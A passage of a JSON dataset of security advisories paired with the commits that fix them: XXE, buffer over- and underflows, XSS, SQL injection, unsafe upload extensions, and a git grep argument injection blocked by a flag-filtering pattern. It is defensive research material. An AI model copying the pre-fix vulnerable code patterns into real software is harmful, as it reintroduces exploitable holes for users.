',doc,docx,pdf,json,rtf,txt,zip,gzip,rar,cad,xml,psd,xlsx,csv,7z';\\n+                $are_allowed .= ',doc,docx,pdf,json,rtf,txt,zip,gzip,rar,cad,psd,xlsx,csv,7z'; \\n                 break;\\n             case 'documents':\\n             case 'doc':\\n-                $are_allowed .= ',doc,docx,pdf,log,msg,odt,pages,rtf,tex,txt,wpd,wps,pps,ppt,pptx,xml,xlr,xls,xlsx';\\n+                $are_allowed .= ',doc,docx,pdf,log,msg,odt,pages,rtf,tex,txt,wpd,wps,pps,ppt,pptx,xlr,xls,xlsx';\\n                 break;\\n             case 'archives':\\n             case 'arc':\"}}","message_norm":"update files.php","language":"fr","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Utils\/System\/Files.php'])","num_files":1.0},{"index":2695,"vuln_id":"GHSA-q485-j897-qc27","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/zhutougg\/c3p0\/commit\/2eb0ea97f745740b18dd45e4a909112d4685f87b'}","dataset":"osv","summary":"Moderate severity vulnerability that affects com.mchange:c3p0 c3p0 0.9.5.2 allows XXE in extractXmlConfigFromInputStream in com\/mchange\/v2\/c3p0\/cfg\/C3P0ConfigXmlUtils.java during initialization.","published_date":"2019-01-07","chain_len":1,"project":"https:\/\/github.com\/zhutougg\/c3p0","commit_href":"https:\/\/github.com\/zhutougg\/c3p0\/commit\/2eb0ea97f745740b18dd45e4a909112d4685f87b","commit_sha":"2eb0ea97f745740b18dd45e4a909112d4685f87b","patch":"SINGLE","chain_ord":"['2eb0ea97f745740b18dd45e4a909112d4685f87b']","before_first_fix_commit":"{'6796e1d0951b52897531e4ea62252191dacb17b5'}","last_fix_commit":"2eb0ea97f745740b18dd45e4a909112d4685f87b","chain_ord_pos":1.0,"commit_datetime":"12\/20\/2018, 13:11:13","message":"Repair XXE vulnerability at initialization","author":"zhutougg","comments":"{'com_1': {'author': 'crazyguyonabike', 'datetime': '01\/09\/2019, 23:26:09', 'body': 'If this actually fixes the CVE, can you do a PR to the original source and\/or make a release?'}, 'com_2': {'author': 'mprins', 'datetime': '02\/21\/2019, 11:17:44', 'body': 'this is resolved in v.0.9.5.3 in a more elegant way, see: https:\/\/github.com\/swaldman\/c3p0\/commit\/7dfdda63f42759a5ec9b63d725b7412f74adb3e1'}}","stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'src\/java\/com\/mchange\/v2\/c3p0\/cfg\/C3P0ConfigXmlUtils.java': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/zhutougg\/c3p0\/raw\/2eb0ea97f745740b18dd45e4a909112d4685f87b\/src%2Fjava%2Fcom%2Fmchange%2Fv2%2Fc3p0%2Fcfg%2FC3P0ConfigXmlUtils.java', 'patch': '@@ -144,6 +144,7 @@ public static C3P0Config extractXmlConfigFromDefaultResource() throws Exception\\n     public static C3P0Config extractXmlConfigFromInputStream(InputStream is) throws Exception\\n     {\\n         DocumentBuilderFactory fact = DocumentBuilderFactory.newInstance();\\n+\\tfact.setExpandEntityReferences(false);\\n         DocumentBuilder db = fact.newDocumentBuilder();\\n         Document doc = db.parse( is );'}}","message_norm":"repair xxe vulnerability at initialization","language":"en","entities":"[('xxe', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('initialization', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/java\/com\/mchange\/v2\/c3p0\/cfg\/C3P0ConfigXmlUtils.java'])","num_files":1.0},{"index":2696,"vuln_id":"GHSA-q4qf-3fc6-8x34","cwe_id":"{'CWE-787', 'CWE-119'}","score":8.7,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2d88f470dea2671b430884260f3626b1fe99830a'}","dataset":"osv","summary":"Segfault and data corruption in tensorflow-lite ### Impact\nTo mimic Python's indexing with negative values, TFLite uses `ResolveAxis` to convert negative values to positive indices. However, the only check that the converted index is now valid is only present in debug builds:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/kernels\/internal\/reference\/reduce.h#L68-L72\n\nIf the `DCHECK` does not trigger, then code execution moves ahead with a negative index. This, in turn, results in accessing data out of bounds which results in segfaults and\/or data corruption.\n### Patches\nWe have patched the issue in 2d88f470dea2671b430884260f3626b1fe99830a and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2020-09-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2d88f470dea2671b430884260f3626b1fe99830a","commit_sha":"2d88f470dea2671b430884260f3626b1fe99830a","patch":"SINGLE","chain_ord":"['2d88f470dea2671b430884260f3626b1fe99830a']","before_first_fix_commit":"{'d487b8c4ca7d77d650fb8dca94b073aad8ff4b5e'}","last_fix_commit":"2d88f470dea2671b430884260f3626b1fe99830a","chain_ord_pos":1.0,"commit_datetime":"09\/18\/2020, 21:43:00","message":"[tflite] Ensure `ResolveAxis` properly handles negative inputs.\n\nIn Python, a list `l` of length `n` allows indexing with negative indices, `l[i]`. The only constraint is that `n + i` becomes positive. Code in `ResolveAxis` assumes the constraints and only checks it using a `DCHECK`. But the macro is a no-op in non-debug builds and that can result in reading from negative offsets (buffer underflows).\n\nPiperOrigin-RevId: 332530683\nChange-Id: I464e073fee618054ae3719a3679739007bb3f3bc","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/lite\/kernels\/internal\/reference\/reduce.h': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/2d88f470dea2671b430884260f3626b1fe99830a\/tensorflow%2Flite%2Fkernels%2Finternal%2Freference%2Freduce.h', 'patch': '@@ -70,6 +70,9 @@ inline bool ResolveAxis(const int num_dims, const int* axis,\\n     \/\/ eg: For num_dims=3, [0, 1, 2] is the same as [-3, -2, -1]  *\/\\n     int current = axis[idx] < 0 ? (axis[idx] + num_dims) : axis[idx];\\n     TFLITE_DCHECK(current >= 0 && current < num_dims);\\n+    if (current < 0 || current >= num_dims) {\\n+      return false;\\n+    }\\n     bool is_dup = false;\\n     for (int j = 0; j < *out_num_axis; ++j) {\\n       if (out_axis[j] == current) {'}}","message_norm":"[tflite] ensure `resolveaxis` properly handles negative inputs.\n\nin python, a list `l` of length `n` allows indexing with negative indices, `l[i]`. the only constraint is that `n + i` becomes positive. code in `resolveaxis` assumes the constraints and only checks it using a `dcheck`. but the macro is a no-op in non-debug builds and that can result in reading from negative offsets (buffer underflows).\n\npiperorigin-revid: 332530683\nchange-id: i464e073fee618054ae3719a3679739007bb3f3bc","language":"en","entities":"[('ensure', 'ACTION', ''), ('buffer underflows', 'SECWORD', ''), ('332530683', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/internal\/reference\/reduce.h'])","num_files":1.0},{"index":2704,"vuln_id":"GHSA-q5wr-fvpq-p67g","cwe_id":"{'CWE-787', 'CWE-190'}","score":8.8,"chain":"{'https:\/\/github.com\/gemini-testing\/png-img\/commit\/14ac462a32ca4b3b78f56502ac976d5b0222ce3d'}","dataset":"osv","summary":"Integer Overflow in png-img An integer overflow in the PngImg::InitStorage_() function of png-img before 3.1.0 leads to an under-allocation of heap memory and subsequently an exploitable heap-based buffer overflow when loading a crafted PNG file.","published_date":"2021-12-10","chain_len":1,"project":"https:\/\/github.com\/gemini-testing\/png-img","commit_href":"https:\/\/github.com\/gemini-testing\/png-img\/commit\/14ac462a32ca4b3b78f56502ac976d5b0222ce3d","commit_sha":"14ac462a32ca4b3b78f56502ac976d5b0222ce3d","patch":"SINGLE","chain_ord":"['14ac462a32ca4b3b78f56502ac976d5b0222ce3d']","before_first_fix_commit":"{'9fedfccb9ab2d1ccee4d7d544f3e03d505317352'}","last_fix_commit":"14ac462a32ca4b3b78f56502ac976d5b0222ce3d","chain_ord_pos":1.0,"commit_datetime":"08\/06\/2020, 00:45:40","message":"Handle image size overflow","author":"Mikhail Cheshkov","comments":null,"stats":"{'additions': 12, 'deletions': 2, 'total': 14}","files":"{'src\/PngImg.cc': {'additions': 12, 'deletions': 2, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gemini-testing\/png-img\/raw\/14ac462a32ca4b3b78f56502ac976d5b0222ce3d\/src%2FPngImg.cc', 'patch': '@@ -60,10 +60,20 @@ void PngImg::ReadInfo_(PngReadStruct& rs) {\\n \/\/\/\\n void PngImg::InitStorage_() {\\n     rowPtrs_.resize(info_.height, nullptr);\\n-    data_ = new png_byte[info_.height * info_.rowbytes];\\n+    \/\/ Extend height and rowbytes from uint32_t to size_t to avoid multiplication overflow when size_t is larger\\n+    size_t h = info_.height;\\n+    size_t rb = info_.rowbytes;\\n+    \/\/ We need to make sure that info_.height * info_.rowbytes will not overflow size_t\\n+    \/\/ Unfotunately, there\\'s no simple and portable way to do this in C++\\n+    \/\/ For integer division of positive numbers a * b > c <==> a > c \/ b holds\\n+    if (h > std::numeric_limits<size_t>::max() \/ rb) {\\n+        \/\/ TODO Propagate this exception to JS, and test it\\n+        throw std::runtime_error(\"Image is too large to allocate single buffer\");\\n+    }\\n+    data_ = new png_byte[h * rb];\\n \\n     for(size_t i = 0; i < info_.height; ++i) {\\n-        rowPtrs_[i] = data_ + i * info_.rowbytes;\\n+        rowPtrs_[i] = data_ + i * rb;\\n     }\\n }'}}","message_norm":"handle image size overflow","language":"en","entities":"[('overflow', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/PngImg.cc'])","num_files":1.0},{"index":2707,"vuln_id":"GHSA-q67f-3jq4-mww2","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/e786fd44aac46febdbf916ed6c328fbe645d80bf'}","dataset":"osv","summary":"Cross-site Scripting in Pimcore Pimcore version 10.3.2 and prior is vulnerable to stored cross-site scripting. A patch is available and anticipated to be part of version 10.3.3.","published_date":"2022-03-05","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/e786fd44aac46febdbf916ed6c328fbe645d80bf","commit_sha":"e786fd44aac46febdbf916ed6c328fbe645d80bf","patch":"SINGLE","chain_ord":"['e786fd44aac46febdbf916ed6c328fbe645d80bf']","before_first_fix_commit":"{'ce5c01f4c9f477444aeceb640b60f3b6199e7c22'}","last_fix_commit":"e786fd44aac46febdbf916ed6c328fbe645d80bf","chain_ord_pos":1.0,"commit_datetime":"03\/02\/2022, 20:15:07","message":"escaping 'key' custom property field in elements","author":"JiaJia Ji","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/element\/properties.js': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/e786fd44aac46febdbf916ed6c328fbe645d80bf\/bundles%2FAdminBundle%2FResources%2Fpublic%2Fjs%2Fpimcore%2Felement%2Fproperties.js', 'patch': '@@ -568,10 +568,11 @@ pimcore.element.properties = Class.create({\\n \\n     addSetFromUserDefined: function (customKey, customType) {\\n         try {\\n-            if (in_array(customKey.getValue(), this.disallowedKeys)) {\\n+            let key = htmlspecialchars(customKey.getValue());\\n+            if (in_array(key, this.disallowedKeys)) {\\n                 Ext.MessageBox.alert(t(\"error\"), t(\"name_is_not_allowed\"));\\n             }\\n-            this.add(customKey.getValue(), customType.getValue(), false, false, false, true);\\n+            this.add(key, customType.getValue(), false, false, false, true);\\n         } catch (e) {\\n             console.log(e);\\n         }'}}","message_norm":"escaping 'key' custom property field in elements","language":"en","entities":"[('escaping', 'SECWORD', ''), ('key', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/element\/properties.js'])","num_files":1.0},{"index":2709,"vuln_id":"GHSA-q6mp-562x-ggvv","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/70b46e231e7b2c113666745a0ab6de9a8b7ef08e'}","dataset":"osv","summary":"Cross-site Scripting in microweber Cross-site Scripting (XSS) - Stored in GitHub repository microweber\/microweber prior to 1.2.19.","published_date":"2022-07-05","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/70b46e231e7b2c113666745a0ab6de9a8b7ef08e","commit_sha":"70b46e231e7b2c113666745a0ab6de9a8b7ef08e","patch":"SINGLE","chain_ord":"['70b46e231e7b2c113666745a0ab6de9a8b7ef08e']","before_first_fix_commit":"{'b7663f9af0f4ab777275ffe7a3b77958f98c81fb'}","last_fix_commit":"70b46e231e7b2c113666745a0ab6de9a8b7ef08e","chain_ord_pos":1.0,"commit_datetime":"07\/04\/2022, 08:02:08","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/MicroweberPackages\/Utils\/System\/Files.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/70b46e231e7b2c113666745a0ab6de9a8b7ef08e\/src%2FMicroweberPackages%2FUtils%2FSystem%2FFiles.php', 'patch': \"@@ -1154,11 +1154,11 @@ function get_allowed_files_extensions_for_upload($fileTypes = 'images', $returnA\\n                 break;\\n             case 'file':\\n             case 'files':\\n-                $are_allowed .= ',css,json,zip,gzip,csv,7z';\\n+                $are_allowed .= ',css,json,zip,gzip,psd,csv,7z';\\n                 break;\\n             case 'documents':\\n             case 'doc':\\n-                $are_allowed .= ',doc,docx,pdf,odt,pages,rtf,txt,pps,ppt,pptx,xls,xlsx';\\n+                $are_allowed .= ',doc,docx,pdf,odt,rtf,txt,pps,ppt,pptx,xls,xlsx';\\n                 break;\\n             case 'archives':\\n             case 'arc':\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/Utils\/System\/Files.php'])","num_files":1.0},{"index":2711,"vuln_id":"GHSA-q73m-3q7r-fpf7","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/d1c9ed0d77ea5d56f09be0c492361dca8af745bb'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc prior to 2.10.4 is vulnerable to stored cross-site scripting via file upload.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/d1c9ed0d77ea5d56f09be0c492361dca8af745bb","commit_sha":"d1c9ed0d77ea5d56f09be0c492361dca8af745bb","patch":"SINGLE","chain_ord":"['d1c9ed0d77ea5d56f09be0c492361dca8af745bb']","before_first_fix_commit":"{'56e450c3adf75c707500d7231a78c9fc894c7f13', 'aa41c83e0cc5079fb39e04d9f630571ffb8bbf22'}","last_fix_commit":"d1c9ed0d77ea5d56f09be0c492361dca8af745bb","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 12:29:34","message":"Merge pull request #1632 from ajaysenr\/master\n\nUpdate AttachmentModel.class.php","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/d1c9ed0d77ea5d56f09be0c492361dca8af745bb\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': \"@@ -325,7 +325,7 @@ public function isAllowedFilename($filename){\\n \\t\\t$allow_array = array(\\n \\t\\t\\t'.jpg','.jpeg','.png','.bmp','.gif','.ico','.webp',\\n \\t\\t\\t'.mp3','.wav','.m4a','.ogg','.webma','.mp4','.flv',\\n-\\t\\t\\t'.mov','.webmv','.m3u8a','.flac','.mkv',\\n+\\t\\t\\t'.mov','.webmv','.flac','.mkv',\\n \\t\\t\\t'.zip','.tar','.gz','.tgz','.ipa','.apk','.rar','.iso','.bz2','.epub',\\n \\t\\t\\t'.pdf','.ofd','.swf','.epub','.xps',\\n \\t\\t\\t'.doc','.docx','.odt','.rtf','.docm','.dotm','.dot','.dotx','.wps','.wpt',\"}}","message_norm":"merge pull request #1632 from ajaysenr\/master\n\nupdate attachmentmodel.class.php","language":"en","entities":"[('#1632', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":2714,"vuln_id":"GHSA-q7q9-w24q-cpgh","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/apache\/ambari\/pull\/3040\/commits\/a9cfdb9dcce63a3494c07c81ebb2cf8da218a210'}","dataset":"osv","summary":"Cross-site Scripting (XSS) in Apache Ambari Views A cross-site scripting issue was found in Apache Ambari Views. This was addressed in Apache Ambari 2.7.4.","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/apache\/ambari","commit_href":"https:\/\/github.com\/apache\/ambari\/pull\/3040\/commits\/a9cfdb9dcce63a3494c07c81ebb2cf8da218a210","commit_sha":"a9cfdb9dcce63a3494c07c81ebb2cf8da218a210","patch":"SINGLE","chain_ord":"['a9cfdb9dcce63a3494c07c81ebb2cf8da218a210']","before_first_fix_commit":"{'9e9ddf752f36aa9340d6dfdc23ecccfcd646fc53'}","last_fix_commit":"a9cfdb9dcce63a3494c07c81ebb2cf8da218a210","chain_ord_pos":1.0,"commit_datetime":"07\/01\/2019, 11:43:05","message":"AMBARI-25329. Ambari breadcrumbs xss vulnerability","author":"Alex Antonenko","comments":null,"stats":"{'additions': 12, 'deletions': 2, 'total': 14}","files":"{'ambari-web\/app\/views\/common\/breadcrumbs_view.js': {'additions': 12, 'deletions': 2, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/ambari\/raw\/a9cfdb9dcce63a3494c07c81ebb2cf8da218a210\/ambari-web%2Fapp%2Fviews%2Fcommon%2Fbreadcrumbs_view.js', 'patch': \"@@ -149,8 +149,16 @@ App.BreadcrumbItem = Em.Object.extend({\\n   createLabel() {\\n     let label = this.get('label');\\n     let labelBindingPath = this.get('labelBindingPath');\\n+    let formattedLabel;\\n+\\n+    if (labelBindingPath) {\\n+      formattedLabel = Ember.Handlebars.Utils.escapeExpression(App.get(_getLabelPathWithoutApp(labelBindingPath)));\\n+    } else{\\n+      formattedLabel = label;\\n+    }\\n+\\n+\\n \\n-    let formattedLabel = labelBindingPath ? App.get(_getLabelPathWithoutApp(labelBindingPath)) : label;\\n     this.set('formattedLabel', this.labelPostFormat(formattedLabel));\\n   },\\n \\n@@ -216,7 +224,9 @@ App.BreadcrumbsView = Em.View.extend({\\n       }\\n       currentState = currentState.get('parentState');\\n     }\\n-    items = items.reverse().map(item => App.BreadcrumbItem.extend(item).create());\\n+    items.reverse();\\n+    items.slice(1).forEach(item => item.label = Ember.Handlebars.Utils.escapeExpression(item.label));\\n+    items = items.map(item => App.BreadcrumbItem.extend(item).create());\\n     if (items.length) {\\n       items.get('lastObject').setProperties({\\n         disabled: true,\"}}","message_norm":"ambari-25329. ambari breadcrumbs xss vulnerability","language":"ca","entities":"[('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ambari-web\/app\/views\/common\/breadcrumbs_view.js'])","num_files":1.0},{"index":2717,"vuln_id":"GHSA-q85f-69q7-55h2","cwe_id":"{'CWE-908'}","score":7.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef1d027be116f25e25bb94a60da491c2cf55bd0b'}","dataset":"osv","summary":"Uninitialized variable access in Tensorflow ### Impact\nThe [implementation of `AssignOp`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/kernels\/assign_op.h#L30-L143) can result in copying unitialized data to a new tensor. This later results in undefined behavior.\n\nThe implementation has a check that the left hand side of the assignment is initialized (to minimize number of allocations), but does not check that the right hand side is also initialized.\n  \n### Patches\nWe have patched the issue in GitHub commit [ef1d027be116f25e25bb94a60da491c2cf55bd0b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef1d027be116f25e25bb94a60da491c2cf55bd0b).\n    \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ef1d027be116f25e25bb94a60da491c2cf55bd0b","commit_sha":"ef1d027be116f25e25bb94a60da491c2cf55bd0b","patch":"SINGLE","chain_ord":"['ef1d027be116f25e25bb94a60da491c2cf55bd0b']","before_first_fix_commit":"{'eeb5e2168a5b3a701656b7366e3bc60d5234471e'}","last_fix_commit":"ef1d027be116f25e25bb94a60da491c2cf55bd0b","chain_ord_pos":1.0,"commit_datetime":"11\/09\/2021, 19:04:04","message":"Prevent copying uninitialized data in `AssignOp`.\n\nThis prevents harder to debug undefined behaviors that cannot be traced back to the original tensor after assignments occur earlier in the graph execution. Several of these undefined behaviors are just reference bindings to null pointers, which are caught when running under ubsan\/asan.\n\nPiperOrigin-RevId: 408654780\nChange-Id: Iad2ec40d43f5fd7ea016c20283356c12d5ddeab1","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/assign_op.h': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ef1d027be116f25e25bb94a60da491c2cf55bd0b\/tensorflow%2Fcore%2Fkernels%2Fassign_op.h', 'patch': '@@ -50,6 +50,12 @@ class AssignOp : public OpKernel {\\n     \/\/ We always return the input ref.\\n     context->forward_ref_input_to_ref_output(0, 0);\\n \\n+    \/\/ Prevent copying uninitialized data, to solve harder to debug undefined\\n+    \/\/ behaviors that cannot be traced back to the original tensor.\\n+    OP_REQUIRES(\\n+        context, rhs.IsInitialized(),\\n+        errors::Internal(\"Right hand side of AssignOp is not initialized\"));\\n+\\n     \/\/ We can\\'t always know how this value will be used downstream, so make\\n     \/\/ conservative assumptions in specifying constraints on the memory\\n     \/\/ allocation attributes, unless the Grappler graph analysis determined that'}}","message_norm":"prevent copying uninitialized data in `assignop`.\n\nthis prevents harder to debug undefined behaviors that cannot be traced back to the original tensor after assignments occur earlier in the graph execution. several of these undefined behaviors are just reference bindings to null pointers, which are caught when running under ubsan\/asan.\n\npiperorigin-revid: 408654780\nchange-id: iad2ec40d43f5fd7ea016c20283356c12d5ddeab1","language":"en","entities":"[('prevent', 'ACTION', ''), ('uninitialized', 'SECWORD', ''), ('prevents', 'ACTION', ''), ('408654780', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/assign_op.h'])","num_files":1.0},{"index":2718,"vuln_id":"GHSA-q863-cchm-c6c6","cwe_id":"{'CWE-89'}","score":7.5,"chain":"{'https:\/\/github.com\/forkcms\/forkcms\/commit\/7a12046a67ae5d8cf04face3ee75e55f03a1a608'}","dataset":"osv","summary":"SQL Injection in Fork CMS Fork CMS contains a SQL injection vulnerability in versions prior to version 5.11.1. When deleting submissions which belong to a formular (made with module `FormBuilder`), the parameter `id[]` is vulnerable to SQL injection.","published_date":"2022-03-25","chain_len":1,"project":"https:\/\/github.com\/forkcms\/forkcms","commit_href":"https:\/\/github.com\/forkcms\/forkcms\/commit\/7a12046a67ae5d8cf04face3ee75e55f03a1a608","commit_sha":"7a12046a67ae5d8cf04face3ee75e55f03a1a608","patch":"SINGLE","chain_ord":"['7a12046a67ae5d8cf04face3ee75e55f03a1a608']","before_first_fix_commit":"{'1b38e33a98992793e998a937b717355212346993'}","last_fix_commit":"7a12046a67ae5d8cf04face3ee75e55f03a1a608","chain_ord_pos":1.0,"commit_datetime":"03\/23\/2022, 12:16:53","message":"Prevent sql injection through the ids of the action","author":"Jelmer Prins","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/forkcms\/forkcms\/raw\/7a12046a67ae5d8cf04face3ee75e55f03a1a608\/src%2FBackend%2FModules%2FFormBuilder%2FEngine%2FModel.php', 'patch': \"@@ -152,6 +152,7 @@ public static function delete(int $id): void\\n     public static function deleteData(array $ids): void\\n     {\\n         $database = BackendModel::getContainer()->get('database');\\n+        $ids = array_map('intval', $ids);\\n \\n         $database->delete('forms_data', 'id IN(' . implode(',', $ids) . ')');\\n         $database->delete('forms_data_fields', 'data_id IN(' . implode(',', $ids) . ')');\"}}","message_norm":"prevent sql injection through the ids of the action","language":"en","entities":"[('prevent', 'ACTION', ''), ('sql injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Backend\/Modules\/FormBuilder\/Engine\/Model.php'])","num_files":1.0},{"index":2725,"vuln_id":"GHSA-q97v-764g-r2rp","cwe_id":"{'CWE-284'}","score":8.8,"chain":"{'https:\/\/github.com\/gollum\/grit_adapter\/commit\/4520d973c81fecfebbeacd2ef2f1849d763951c7'}","dataset":"osv","summary":"High severity vulnerability that affects gollum and gollum-lib The gollum-grit_adapter Ruby gem dependency in gollum before 3.1.1 and the gollum-lib gem dependency in gollum-lib before 4.0.1 when the string \"master\" is in any of the wiki documents, allows remote authenticated users to execute arbitrary code via the -O or --open-files-in-pager flags.","published_date":"2017-11-16","chain_len":1,"project":"https:\/\/github.com\/gollum\/grit_adapter","commit_href":"https:\/\/github.com\/gollum\/grit_adapter\/commit\/4520d973c81fecfebbeacd2ef2f1849d763951c7","commit_sha":"4520d973c81fecfebbeacd2ef2f1849d763951c7","patch":"SINGLE","chain_ord":"['4520d973c81fecfebbeacd2ef2f1849d763951c7']","before_first_fix_commit":"{'1b04ba5a1e822a990d6bde99b7332eef56a9998c'}","last_fix_commit":"4520d973c81fecfebbeacd2ef2f1849d763951c7","chain_ord_pos":1.0,"commit_datetime":"12\/04\/2014, 12:45:17","message":"Fix security issue with git grep -O","author":"Dawa Ometto","comments":"{'com_1': {'author': 'dometto', 'datetime': '12\/04\/2014, 13:53:01', 'body': 'Escape the `ls_files` query for good measure.'}}","stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'lib\/grit_adapter\/git_layer_grit.rb': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gollum\/grit_adapter\/raw\/4520d973c81fecfebbeacd2ef2f1849d763951c7\/lib%2Fgrit_adapter%2Fgit_layer_grit.rb', 'patch': '@@ -136,6 +136,8 @@ def exist?\\n       \\n       def grep(query, options={})\\n         ref = options[:ref] ? options[:ref] : \"HEAD\"\\n+        query = Shellwords.split(query).select {|q| !(q =~ \/^(-O)|(--open-files-in-pager)\/) }\\n+        query = Shellwords.join(query)\\n         args = [{}, \\'-I\\', \\'-i\\', \\'-c\\', query, ref, \\'--\\']\\n         args << options[:path] if options[:path]\\n         result = @git.grep(*args).split(\"\\\\n\")\\n@@ -165,6 +167,7 @@ def rev_list(options, *refs)\\n       \\n       def ls_files(query, options = {})\\n         options[:ref] = options[:ref] ? options[:ref] : \"HEAD\"\\n+        query = Shellwords.shellescape(query)\\n         @git.ls_files({}, \"*#{query}*\").split(\"\\\\n\")\\n       end'}}","message_norm":"fix security issue with git grep -o","language":"en","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/grit_adapter\/git_layer_grit.rb'])","num_files":1.0},{"index":2727,"vuln_id":"GHSA-q99r-j969-6jwr","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7e9a2ee60baa95ceb4f48f522f823c812ca90c80', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/31f2588c7ba5b446bccf2769e9ecf4d444b73045'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1138, CVE-2019-1217, CVE-2019-1298, 